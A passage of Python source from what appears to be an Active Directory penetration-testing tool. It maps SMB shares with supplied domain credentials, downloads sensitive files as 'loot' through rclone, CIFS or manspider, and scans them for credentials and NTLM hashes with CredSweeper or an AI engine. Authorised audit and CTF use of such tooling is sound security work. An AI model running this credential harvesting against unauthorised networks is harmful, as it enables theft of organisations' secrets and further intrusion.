        password=password,
        backend="rclone_direct",
        ai_configured=availability.configured,
    )


def _print_deterministic_rclone_completion_summary(
    *,
    backend_context: dict[str, Any] | None,
) -> None:
    """Print one final production summary for deterministic rclone runs."""
    if not backend_context or backend_context.get("mode") not in {"direct", "mapped"}:
        return
    loot_root_rel = str(backend_context.get("loot_root_rel", "") or "").strip()
    if not loot_root_rel:
        return
    print_info(
        "Deterministic rclone analysis completed. "
        f"Loot root: {mark_sensitive(loot_root_rel, 'path')}."
    )


def _prepare_post_mapping_deterministic_rclone_context(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    backend: str,
) -> dict[str, Any]:
    """Prepare shared rclone state once for one production deterministic run."""
    mode = "mapped" if backend == "rclone_mapped" else "direct"
    workspace_cwd = shell._get_workspace_cwd()
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_folder = f"{run_id}_{_slugify_token(username)}_{mode}"
    run_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "deterministic",
        run_folder,
    )
    loot_root_abs = os.path.join(run_root_abs, "phases")
    os.makedirs(loot_root_abs, exist_ok=True)
    loot_root_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "deterministic",
        run_folder,
        "phases",
    )
    rationale = "Audit traceability" if mode == "mapped" else "CTF speed"
    print_info(
        "Deterministic backend: "
        f"{mark_sensitive('rclone', 'text')} | Mode: {mark_sensitive(mode, 'text')} "
        f"({mark_sensitive(rationale, 'text')})."
    )
    print_info(
        f"Deterministic rclone loot root: {mark_sensitive(loot_root_rel, 'path')}."
    )

    context = {
        "completed": True,
        "mode": mode,
        "run_root_abs": run_root_abs,
        "loot_root_abs": loot_root_abs,
        "loot_root_rel": loot_root_rel,
        "aggregate_map_path": None,
    }
    if mode != "mapped":
        return context

    mapping_root_abs = os.path.join(run_root_abs, "mapping")
    run_output_abs = os.path.join(mapping_root_abs, "runs", run_folder)
    aggregate_map_abs = os.path.join(mapping_root_abs, "share_tree_map.json")
    mapping_result = _generate_rclone_mapping(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        hosts=hosts,
        shares=shares,
        share_map=share_map,
        run_output_abs=run_output_abs,
        aggregate_map_abs=aggregate_map_abs,
    )
    if not bool(mapping_result.get("success")):
        print_warning(
            "Fresh rclone mapping for deterministic analysis did not complete successfully."
        )
        return {**context, "completed": False, "mapping_result": mapping_result}
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "deterministic",
        run_folder,
        "mapping",
        "share_tree_map.json",
    )
    print_info(
        "Deterministic rclone mapping prepared at "
        f"{mark_sensitive(aggregate_map_rel, 'path')}."
    )
    context["aggregate_map_path"] = aggregate_map_abs
    context["mapping_result"] = mapping_result
    return context


def _should_continue_with_deeper_sensitive_scan(
    *,
    shell: Any,
    domain: str,
    phase_result: dict[str, Any],
) -> bool:
    """Ask whether deeper deterministic SMB analysis should continue."""
    return _service_should_continue_with_deeper_sensitive_scan(
        shell=shell,
        domain=domain,
        phase_result=phase_result,
    )


def _should_run_credential_phase(
    *,
    shell: Any,
    domain: str,
    phase: str,
    prior_phase_result: dict[str, Any] | None,
) -> bool:
    """Ask whether one credential phase should run."""
    return _service_should_run_credential_phase(
        shell=shell,
        domain=domain,
        phase=phase,
        prior_phase_result=prior_phase_result,
    )


def _should_continue_with_heavy_artifact_analysis(
    *,
    shell: Any,
    domain: str,
) -> bool:
    """Ask whether to run the slowest artifact analysis phase."""
    return _service_should_continue_with_heavy_artifact_analysis(
        shell=shell,
        domain=domain,
    )


def _should_skip_sensitive_scan_prompt_for_ctf_pwned(
    *, shell: Any, domain: str
) -> bool:
    """Return True when CTF SMB follow-up prompts should be skipped entirely."""
    return _service_should_skip_sensitive_scan_prompt_for_ctf_pwned(
        shell=shell,
        domain=domain,
    )


def _run_sensitive_scan_phase_with_backend(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    backend: str,
    phase: str,
    cifs_mount_root: str | None = None,
    backend_context: dict[str, Any] | None = None,
    analysis_context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Run one deterministic sensitive-data phase through a selected backend."""
    if backend in {"rclone_direct", "rclone_mapped"}:
        if phase in {
            SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
            SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
        }:
            return _run_post_mapping_deterministic_rclone_credsweeper_scan(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                share_map=share_map,
                username=username,
                password=password,
                phase=phase,
                backend_context=backend_context or {},
                analysis_context=analysis_context or {},
            )
        return _run_post_mapping_deterministic_rclone_artifact_scan(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            share_map=share_map,
            username=username,
            password=password,
            phase=phase,
            backend_context=backend_context or {},
        )

    if backend == "cifs":
        if phase in {
            SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
            SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
        }:
            return _run_post_mapping_deterministic_cifs_credsweeper_scan(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                share_map=share_map,
                username=username,
                password=password,
                cifs_mount_root=cifs_mount_root,
                profile=str(get_sensitive_phase_definition(phase).get("profile", "")),
                phase=phase,
                analysis_context=analysis_context or {},
            )
        return _run_post_mapping_deterministic_cifs_artifact_scan(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            share_map=share_map,
            username=username,
            password=password,
            cifs_mount_root=cifs_mount_root,
            phase=phase,
        )

    if phase in {
        SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
        SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
    }:
        manspider_passw = getattr(shell, "manspider_passw", None)
        if not callable(manspider_passw):
            print_warning(
                "Deterministic SMB share search is unavailable: "
                "shell.manspider_passw is not callable."
            )
            return {"completed": False, "credential_findings": 0, "phase": phase}
        return manspider_passw(
            domain,
            username,
            password,
            shares,
            hosts,
            profile=str(get_sensitive_phase_definition(phase).get("profile", "")),
            phase=phase,
            analysis_context=analysis_context or {},
        ) or {"completed": True, "credential_findings": 0, "phase": phase}

    manspider_extensions = getattr(shell, "manspider_extensions", None)
    if not callable(manspider_extensions):
        print_warning(
            "Deterministic SMB artifact analysis is unavailable: "
            "shell.manspider_extensions is not callable."
        )
        return {"completed": False, "artifact_hits": 0, "phase": phase}
    return manspider_extensions(
        domain,
        username,
        password,
        shares,
        hosts,
        extensions=get_manspider_phase_extensions(phase),
        phase=phase,
    ) or {"completed": True, "artifact_hits": 0, "phase": phase}


def _try_reuse_cached_rclone_credential_phase(
    *,
    shell: Any,
    domain: str,
    phase: str,
    username: str,
    hosts: list[str],
    shares: list[str],
    loot_dir: str,
    cache_paths: dict[str, str],
    cache_enabled: bool,
    cache_entries: list[Any],
    cache_signature: str,
    cache_service: Any,
    analysis_context: dict[str, Any],
) -> dict[str, Any] | None:
    """Return cached credential phase results when the deterministic rclone cache is reusable."""
    if not cache_enabled or not cache_entries:
        return None
    cache_payload = cache_service.load_cache_manifest(
        manifest_path=cache_paths["manifest_path"]
    )
    cache_ok, cache_reason = cache_service.cache_payload_is_reusable(
        manifest_payload=cache_payload,
        expected_signature=cache_signature,
        required_paths=[
            loot_dir,
            cache_paths["credsweeper_dir"],
        ],
    )
    marked_phase_label = mark_sensitive(
        str(get_sensitive_phase_definition(phase).get("label", phase)),
        "text",
    )
    if not cache_ok:
        print_info_debug(
            "Deterministic rclone phase cache not reused: "
            f"phase={marked_phase_label} reason={mark_sensitive(cache_reason, 'text')}"
        )
        return None
    candidate_files = (
        int(cache_payload.get("candidate_files", 0) or 0)
        if isinstance(cache_payload, dict)
        else 0
    )
    dev_cache_action = _select_dev_cache_action(
        shell=shell,
        title="SMB rclone phase cache:",
        summary_lines=[
            f"Phase: {str(get_sensitive_phase_definition(phase).get('label', phase))}",
            f"Principal: {username}",
            f"Cache: {cache_paths['cache_root_rel']}",
            f"Candidates: {candidate_files}",
        ],
    )
    if dev_cache_action == "refresh":
        print_info(
            f"Refreshing deterministic rclone phase {marked_phase_label} because dev mode requested a new run."
        )
        return None
    analysis_engine = _select_loot_credential_analysis_engine(
        shell=shell,
        analysis_context=analysis_context,
        phase=phase,
        phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
        candidate_files=candidate_files,
    )
    credsweeper_findings = cache_service.deserialize_grouped_findings(
        dict(cache_payload.get("findings") or {})
        if isinstance(cache_payload, dict)
        else {}
    )
    structured_stats = (
        dict(cache_payload.get("structured_stats") or {})
        if isinstance(cache_payload, dict)
        else {}
    )
    total_findings = (
        int(cache_payload.get("total_findings", 0) or 0)
        if isinstance(cache_payload, dict)
        else 0
    )
    files_with_findings = (
        int(cache_payload.get("files_with_findings", 0) or 0)
        if isinstance(cache_payload, dict)
        else 0
    )
    from adscan_internal.services.windows_loot_cache_service import (
        resolve_loot_cache_age_seconds as _resolve_loot_cache_age,
    )

    cache_age_seconds = _resolve_loot_cache_age(cache_paths["manifest_path"])
    if cache_age_seconds is None:
        cache_generated_at = (
            str(cache_payload.get("generated_at") or "").strip()
            if isinstance(cache_payload, dict)
            else ""
        )
        cache_age_seconds = _resolve_smb_mapping_cache_age_seconds(cache_generated_at)
    cache_age_label = (
        f"{cache_age_seconds:.0f}s old"
        if cache_age_seconds is not None
        else "age unknown"
    )
    print_info(
        "Reusing cached deterministic rclone phase outputs for "
        f"{marked_phase_label} ({candidate_files} files, {cache_age_label}, "
        f"loot={mark_sensitive(cache_paths['cache_root_rel'], 'path')})."
    )
    if (
        analysis_engine == _SMB_LOOT_ANALYSIS_ENGINE_CREDSWEEPER
        and credsweeper_findings
    ):
        shell.handle_found_credentials(
            credsweeper_findings,
            domain,
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            source_artifact="rclone deterministic share scan (cached)",
        )
    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
    ntlm_hash_findings = structured_stats.get("ntlm_hash_findings")
    if isinstance(ntlm_hash_findings, list) and ntlm_hash_findings:
        render_ntlm_hash_findings_flow(
            shell,
            domain=domain,
            loot_dir=loot_dir,
            loot_rel=loot_rel,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            ntlm_hash_findings=[
                item for item in ntlm_hash_findings if isinstance(item, dict)
            ],
            source_scope=(
                "SMB file NTLM hash findings from "
                f"{str(get_sensitive_phase_definition(phase).get('label', phase))}"
            ),
            fallback_source_hosts=hosts,
            fallback_source_shares=shares,
        )
    structured_files_with_findings = int(
        structured_stats.get("files_with_findings", 0) or 0
    )
    total_files_with_findings = (
        int(files_with_findings) + structured_files_with_findings
    )
    print_info(
        "Deterministic rclone phase summary: "
        f"phase={marked_phase_label} candidate_files={candidate_files} "
        f"files_with_findings={files_with_findings} "
        f"credential_like_findings={total_findings} "
        f"loot={mark_sensitive(loot_rel, 'path')} "
        f"cache={mark_sensitive('reused', 'text')}"
    )
    if not credsweeper_findings and structured_files_with_findings == 0:
        _print_analyzed_no_findings_preview(
            loot_dir=loot_dir,
            loot_rel=loot_rel,
            candidate_files=candidate_files,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            preview_limit=5,
        )
    return {
        "completed": True,
        "credential_findings": int(total_findings),
        "files_with_findings": int(total_files_with_findings),
        "candidate_files": int(candidate_files),
        "phase": phase,
        "loot_dir": loot_dir,
        "cache_reused": True,
        "ai_attempted": False,
        "ai_success": None,
    }


def _run_rclone_credential_phase_download(
    *,
    shell: Any,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None,
    username: str,
    password: str,
    phase_profile: str,
    loot_dir: str,
    manifest_dir: str,
    cache_enabled: bool,
    cache_paths: dict[str, str],
    backend_context: dict[str, Any],
    max_document_file_size_bytes: int | None,
) -> dict[str, Any]:
    """Download deterministic rclone credential loot for one phase."""
    if str(backend_context.get("mode", "")) == "mapped":
        from adscan_internal.services.share_mapping_service import ShareMappingService

        aggregate_map_path = str(
            backend_context.get("aggregate_map_path", "") or ""
        ).strip()
        share_mapping_service = ShareMappingService()
        grouped_remote_paths = (
            share_mapping_service.resolve_candidate_remote_paths_from_aggregate(
                aggregate_map_path=aggregate_map_path,
                hosts=hosts,
                shares=shares,
                extensions=get_sensitive_file_extensions(phase_profile),
                max_file_size_bytes=max_document_file_size_bytes,
            )
        )
        if cache_enabled:
            shutil.rmtree(loot_dir, ignore_errors=True)
            shutil.rmtree(cache_paths["credsweeper_dir"], ignore_errors=True)
            os.makedirs(loot_dir, exist_ok=True)
            os.makedirs(cache_paths["credsweeper_dir"], exist_ok=True)
        return _run_rclone_copy_mapped_loot_download(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            grouped_remote_paths=grouped_remote_paths,
            loot_dir=loot_dir,
            manifest_dir=manifest_dir,
            mostly_small_files=True,
            operation_label="deterministic mapped scan",
            max_size_bytes=max_document_file_size_bytes,
        )
    target_pairs = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    return _run_rclone_copy_loot_download(
        shell=shell,
        domain=domain,
        username=username,
        password=password,
        target_pairs=target_pairs,
        loot_dir=loot_dir,
        extensions=get_sensitive_file_extensions(phase_profile),
        mostly_small_files=True,
        operation_label="deterministic scan",
        max_size_bytes=max_document_file_size_bytes,
    )


def _finalize_rclone_credential_phase(
    *,
    shell: Any,
    domain: str,
    phase: str,
    hosts: list[str],
    shares: list[str],
    username: str,
    loot_dir: str,
    candidate_files: int,
    analysis_context: dict[str, Any],
    ai_history_path: str,
    credsweeper_path: str,
    credsweeper_output_dir: str,
    credsweeper_findings: dict[str, list[tuple[Any, Any, Any, Any, Any]]],
    structured_stats: dict[str, Any],
) -> dict[str, Any]:
    """Run post-download analysis and render final summary for one rclone credential phase."""
    analysis_result = run_loot_credential_analysis(
        shell,
        domain=domain,
        loot_dir=loot_dir,
        phase=phase,
        phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
        candidate_files=candidate_files,
        analysis_context=analysis_context,
        ai_history_path=ai_history_path,
        credsweeper_path=credsweeper_path,
        credsweeper_output_dir=credsweeper_output_dir,
        jobs=get_default_credsweeper_jobs(),
        credsweeper_findings=credsweeper_findings,
    )
    combined_findings = dict(analysis_result.findings)
    ai_findings = list(analysis_result.ai_findings)
    ai_attempted = analysis_result.ai_attempted
    ai_success = analysis_result.ai_success
    analysis_engine = analysis_result.analysis_engine
    if ai_attempted:
        analysis_context["ai_attempted"] = True
        analysis_context["ai_success"] = ai_success
    if combined_findings and analysis_engine in {
        _SMB_LOOT_ANALYSIS_ENGINE_CREDSWEEPER,
        _SMB_LOOT_ANALYSIS_ENGINE_BOTH,
    }:
        shell.handle_found_credentials(
            combined_findings,
            domain,
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            source_artifact="rclone deterministic share scan",
            analysis_origin=(
                "mixed"
                if analysis_engine == _SMB_LOOT_ANALYSIS_ENGINE_BOTH
                else "credsweeper"
            ),
            ai_findings=ai_findings,
        )
    elif combined_findings and analysis_engine == _SMB_LOOT_ANALYSIS_ENGINE_AI:
        shell.handle_found_credentials(
            combined_findings,
            domain,
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            source_artifact="AI share loot analysis",
            analysis_origin="ai",
            ai_findings=ai_findings,
        )
    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
    ntlm_hash_findings = structured_stats.get("ntlm_hash_findings")
    if isinstance(ntlm_hash_findings, list) and ntlm_hash_findings:
        render_ntlm_hash_findings_flow(
            shell,
            domain=domain,
            loot_dir=loot_dir,
            loot_rel=loot_rel,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            ntlm_hash_findings=[
                item for item in ntlm_hash_findings if isinstance(item, dict)
            ],
            source_scope=(
                "SMB file NTLM hash findings from "
                f"{str(get_sensitive_phase_definition(phase).get('label', phase))}"
            ),
            fallback_source_hosts=hosts,
            fallback_source_shares=shares,
        )
    ai_total_findings, ai_files_with_findings = _count_grouped_credential_findings(
        combined_findings
    )
    print_info(
        "Deterministic rclone phase summary: "
        f"phase={mark_sensitive(str(get_sensitive_phase_definition(phase).get('label', phase)), 'text')} "
        f"candidate_files={candidate_files} "
        f"files_with_findings={ai_files_with_findings} "
        f"credential_like_findings={ai_total_findings} "
        f"loot={mark_sensitive(loot_rel, 'path')} "
        f"analysis_engine={mark_sensitive(analysis_engine, 'text')}"
    )
    structured_files_with_findings = int(
        structured_stats.get("files_with_findings", 0) or 0
    )
    total_files_with_findings = (
        int(ai_files_with_findings) + structured_files_with_findings
    )
    if not combined_findings and structured_files_with_findings == 0:
        _print_analyzed_no_findings_preview(
            loot_dir=loot_dir,
            loot_rel=loot_rel,
            candidate_files=candidate_files,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            preview_limit=5,
        )
    render_ranked_findings_panel(
        findings=list(analysis_result.secret_findings),
        loot_dir=loot_dir,
        phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
    )
    render_files_of_concern_panel(
        indicators=list(analysis_result.indicators),
        loot_dir=loot_dir,
        phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
    )
    return {
        "completed": True,
        "credential_findings": int(ai_total_findings),
        "files_with_findings": int(total_files_with_findings),
        "candidate_files": int(candidate_files),
        "phase": phase,
        "loot_dir": loot_dir,
        "cache_reused": False,
        "ai_attempted": ai_attempted,
        "ai_success": ai_success,
    }


def _run_post_mapping_deterministic_rclone_credsweeper_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    phase: str,
    backend_context: dict[str, Any],
    analysis_context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Run one production deterministic rclone credential phase."""
    from adscan_internal.services.smb_rclone_phase_cache_service import (
        SMBRclonePhaseCacheService,
    )

    credsweeper_path = str(getattr(shell, "credsweeper_path", "") or "").strip()
    if not credsweeper_path:
        print_warning(
            "Deterministic rclone share analysis is unavailable because "
            "CredSweeper is not configured."
        )
        return {"completed": False, "credential_findings": 0, "phase": phase}

    phase_profile = str(
        get_sensitive_phase_definition(phase).get("profile", "")
    ).strip()
    if not phase_profile:
        return {"completed": False, "credential_findings": 0, "phase": phase}

    phase_root_abs = os.path.join(
        str(backend_context.get("run_root_abs", "") or ""), phase
    )
    analysis_context = analysis_context or {}
    marked_phase_label = mark_sensitive(
        str(get_sensitive_phase_definition(phase).get("label", phase)),
        "text",
    )
    print_info(
        f"Running deterministic share analysis ({marked_phase_label}) via rclone."
    )
    max_document_file_size_bytes = get_sensitive_phase_max_file_size_bytes(phase)
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "unknown"
    cache_enabled = (
        workspace_type in {"audit", "ctf"}
        and str(backend_context.get("mode", "") or "").strip() == "mapped"
    )
    cache_service = SMBRclonePhaseCacheService()
    cache_paths = _resolve_smb_rclone_phase_cache_paths(
        shell,
        domain=domain,
        username=username,
        phase=phase,
    )
    ai_history_path = _resolve_smb_loot_ai_history_path(
        shell,
        domain=domain,
        username=username,
        phase=phase,
        backend="rclone",
    )
    loot_dir = (
        cache_paths["loot_dir"]
        if cache_enabled
        else os.path.join(phase_root_abs, "loot")
    )
    manifest_dir = os.path.join(phase_root_abs, "manifests")
    os.makedirs(loot_dir, exist_ok=True)
    os.makedirs(manifest_dir, exist_ok=True)
    os.makedirs(cache_paths["credsweeper_dir"], exist_ok=True)

    cache_entries: list[Any] = []
    cache_signature = ""
    candidate_files = 0
    credsweeper_findings: dict[str, list[tuple[Any, Any, Any, Any, Any]]] = {}
    structured_stats: dict[str, Any] = {}

    if str(backend_context.get("mode", "")) == "mapped":
        aggregate_map_path = str(
            backend_context.get("aggregate_map_path", "") or ""
        ).strip()
        cache_entries = cache_service.resolve_candidate_entries_from_aggregate(
            aggregate_map_path=aggregate_map_path,
            hosts=hosts,
            shares=shares,
            extensions=get_sensitive_file_extensions(phase_profile),
            max_file_size_bytes=max_document_file_size_bytes,
        )
        cache_signature = cache_service.build_phase_signature(
            phase=phase,
            entries=cache_entries,
            max_file_size_bytes=max_document_file_size_bytes,
        )
        reused_result = _try_reuse_cached_rclone_credential_phase(
            shell=shell,
            domain=domain,
            phase=phase,
            username=username,
            hosts=hosts,
            shares=shares,
            loot_dir=loot_dir,
            cache_paths=cache_paths,
            cache_enabled=cache_enabled,
            cache_entries=cache_entries,
            cache_signature=cache_signature,
            cache_service=cache_service,
            analysis_context=analysis_context,
        )
        if reused_result is not None:
            return reused_result
    download_result = _run_rclone_credential_phase_download(
        shell=shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=username,
        password=password,
        phase_profile=phase_profile,
        loot_dir=loot_dir,
        manifest_dir=manifest_dir,
        cache_enabled=cache_enabled,
        cache_paths=cache_paths,
        backend_context=backend_context,
        max_document_file_size_bytes=max_document_file_size_bytes,
    )
    if not bool(download_result.get("success")):
        return {"completed": False, "credential_findings": 0, "phase": phase}

    candidate_files = _count_files_under_path(loot_dir)
    credsweeper_output_dir = (
        cache_paths["credsweeper_dir"]
        if cache_enabled
        else os.path.join(phase_root_abs, "credsweeper")
    )
    analysis_engine = _select_loot_credential_analysis_engine(
        shell=shell,
        analysis_context=analysis_context,
        phase=phase,
        phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
        candidate_files=candidate_files,
    )
    if analysis_engine in {
        _SMB_LOOT_ANALYSIS_ENGINE_CREDSWEEPER,
        _SMB_LOOT_ANALYSIS_ENGINE_BOTH,
    }:
        credsweeper_findings = _run_credsweeper_path_scan_with_scope(
            credsweeper_service=shell._get_credsweeper_service(),
            credsweeper_path=credsweeper_path,
            path_to_scan=loot_dir,
            json_output_dir=credsweeper_output_dir,
            benchmark_scope=(
                SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
                if phase == SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS
                else SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY
            ),
            candidate_files=candidate_files,
            jobs=get_default_credsweeper_jobs(),
            find_by_ext=False,
        )
    structured_stats = (
        structured_stats
        or shell._get_spidering_service().process_local_structured_files(
            root_path=loot_dir,
            phase=phase,
            domain=domain,
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            apply_actions=True,
        )
    )
    total_findings, files_with_findings = _count_grouped_credential_findings(
        credsweeper_findings
    )
    finalized_result = _finalize_rclone_credential_phase(
        shell=shell,
        domain=domain,
        phase=phase,
        hosts=hosts,
        shares=shares,
        username=username,
        loot_dir=loot_dir,
        candidate_files=candidate_files,
        analysis_context=analysis_context,
        ai_history_path=ai_history_path,
        credsweeper_path=credsweeper_path,
        credsweeper_output_dir=credsweeper_output_dir,
        credsweeper_findings=credsweeper_findings,
        structured_stats=structured_stats,
    )
    if cache_enabled and cache_entries:
        cache_service.write_cache_manifest(
            manifest_path=cache_paths["manifest_path"],
            phase=phase,
            signature=cache_signature,
            candidate_files=candidate_files,
            extra={
                "findings": cache_service.serialize_grouped_findings(
                    credsweeper_findings
                ),
                "structured_stats": structured_stats,
                "total_findings": int(total_findings),
                "files_with_findings": int(files_with_findings),
            },
        )
    return finalized_result


def _print_analyzed_no_findings_preview(
    *,
    loot_dir: str,
    loot_rel: str,
    candidate_files: int,
    phase_label: str | None = None,
    preview_limit: int = 5,
) -> None:
    """Print a compact preview of analyzed files when no credentials were extracted."""
    render_no_extracted_findings_preview(
        loot_dir=loot_dir,
        loot_rel=loot_rel,
        analyzed_count=int(candidate_files or 0),
        category="credential",
        phase_label=phase_label,
        preview_limit=preview_limit,
    )


def _collect_loot_file_preview(*, loot_dir: str, preview_limit: int = 5) -> list[str]:
    """Return a deterministic preview of files downloaded for one loot phase."""
    return collect_loot_file_preview(
        loot_dir=loot_dir,
        preview_limit=preview_limit,
    )


def _run_post_mapping_deterministic_rclone_artifact_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    phase: str,
    backend_context: dict[str, Any],
) -> dict[str, Any]:
    """Run one production deterministic rclone artifact phase."""
    from adscan_internal.services.smb_rclone_phase_cache_service import (
        SMBRclonePhaseCacheService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService

    phase_root_abs = os.path.join(
        str(backend_context.get("run_root_abs", "") or ""), phase
    )
    phase_label = str(get_sensitive_phase_definition(phase).get("label", phase))
    print_info(
        f"Running deterministic share analysis ({mark_sensitive(phase_label, 'text')}) via rclone."
    )
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "unknown"
    cache_enabled = (
        workspace_type in {"audit", "ctf"}
        and str(backend_context.get("mode", "") or "").strip() == "mapped"
    )
    cache_service = SMBRclonePhaseCacheService()
    cache_paths = _resolve_smb_rclone_phase_cache_paths(
        shell,
        domain=domain,
        username=username,
        phase=phase,
    )
    loot_dir = (
        cache_paths["loot_dir"]
        if cache_enabled
        else os.path.join(phase_root_abs, "loot")
    )
    manifest_dir = os.path.join(phase_root_abs, "manifests")
    os.makedirs(loot_dir, exist_ok=True)
    os.makedirs(manifest_dir, exist_ok=True)
    cache_entries: list[Any] = []
    cache_signature = ""
    if str(backend_context.get("mode", "")) == "mapped":
        aggregate_map_path = str(
            backend_context.get("aggregate_map_path", "") or ""
        ).strip()
        share_mapping_service = ShareMappingService()
        cache_entries = cache_service.resolve_candidate_entries_from_aggregate(
            aggregate_map_path=aggregate_map_path,
            hosts=hosts,
            shares=shares,
            extensions=get_sensitive_phase_extensions(phase),
        )
        cache_signature = cache_service.build_phase_signature(
            phase=phase,
            entries=cache_entries,
        )
        if cache_enabled and cache_entries:
            cache_payload = cache_service.load_cache_manifest(
                manifest_path=cache_paths["manifest_path"]
            )
            cache_ok, cache_reason = cache_service.cache_payload_is_reusable(
                manifest_payload=cache_payload,
                expected_signature=cache_signature,
                required_paths=[loot_dir],
            )
            if cache_ok:
                dev_cache_action = _select_dev_cache_action(
                    shell=shell,
                    title="SMB rclone phase cache:",
                    summary_lines=[
                        f"Phase: {phase_label}",
                        f"Principal: {username}",
                        f"Cache: {cache_paths['cache_root_rel']}",
                        f"Artifacts: {int(cache_payload.get('artifact_hits', 0) or 0) if isinstance(cache_payload, dict) else 0}",
                    ],
                )
                if dev_cache_action == "refresh":
                    print_info(
                        "Refreshing deterministic rclone artifact phase because dev mode requested a new run."
                    )
                else:
                    artifact_records = _deserialize_cached_artifact_records(
                        list(cache_payload.get("artifact_records") or [])
                        if isinstance(cache_payload, dict)
                        else []
                    )
                    artifact_hits = (
                        int(cache_payload.get("artifact_hits", 0) or 0)
                        if isinstance(cache_payload, dict)
                        else 0
                    )
                    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
                    from adscan_internal.services.windows_loot_cache_service import (
                        resolve_loot_cache_age_seconds as _resolve_loot_cache_age,
                    )

                    _manifest_age = _resolve_loot_cache_age(cache_paths["manifest_path"])
                    if _manifest_age is None:
                        _manifest_age = _resolve_smb_mapping_cache_age_seconds(
                            str(cache_payload.get("generated_at") or "").strip()
                            if isinstance(cache_payload, dict) else ""
                        )
                    cache_age_seconds = _manifest_age
                    cache_age_label = (
                        f"{cache_age_seconds:.0f}s old"
                        if cache_age_seconds is not None
                        else "age unknown"
                    )
                    print_info(
                        "Reusing cached deterministic rclone phase outputs for "
                        f"{mark_sensitive(phase_label, 'text')} ({artifact_hits} files, {cache_age_label}, "
                        f"loot={mark_sensitive(cache_paths['cache_root_rel'], 'path')})."
                    )
                    if not artifact_records:
                        print_info(
                            f"No artifact candidates were detected for phase {phase_label}."
                        )
                    else:
                        report_path = _persist_artifact_processing_report(
                            phase_root_abs=cache_paths["cache_root_abs"],
                            records=artifact_records,
                        )
                        _render_artifact_processing_summary(
                            shell,
                            phase_label=phase_label,
                            records=artifact_records,
                            report_path=report_path,
                        )
                        if artifact_records_extracted_nothing(artifact_records):
                            render_no_extracted_findings_preview(
                                loot_dir=loot_dir,
                                loot_rel=loot_rel,
                                analyzed_count=artifact_hits,
                                category="artifact",
                                phase_label=phase_label,
                                preview_limit=5,
                            )
                    print_info(
                        "Deterministic rclone artifact summary: "
                        f"phase={mark_sensitive(phase_label, 'text')} "
                        f"artifact_hits={artifact_hits} "
                        f"loot={mark_sensitive(loot_rel, 'path')} "
                        f"cache={mark_sensitive('reused', 'text')}"
                    )
                    return {
                        "completed": True,
                        "artifact_hits": artifact_hits,
                        "phase": phase,
                        "loot_dir": loot_dir,
                        "cache_reused": True,
                    }
            print_info_debug(
                "Deterministic rclone artifact cache not reused: "
                f"phase={mark_sensitive(phase_label, 'text')} reason={mark_sensitive(cache_reason, 'text')}"
            )
        grouped_remote_paths = (
            share_mapping_service.resolve_candidate_remote_paths_from_aggregate(
                aggregate_map_path=aggregate_map_path,
                hosts=hosts,
                shares=shares,
                extensions=get_sensitive_phase_extensions(phase),
            )
        )
        if cache_enabled:
            shutil.rmtree(loot_dir, ignore_errors=True)
            os.makedirs(loot_dir, exist_ok=True)
        download_result = _run_rclone_copy_mapped_loot_download(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            grouped_remote_paths=grouped_remote_paths,
            loot_dir=loot_dir,
            manifest_dir=manifest_dir,
            mostly_small_files=False,
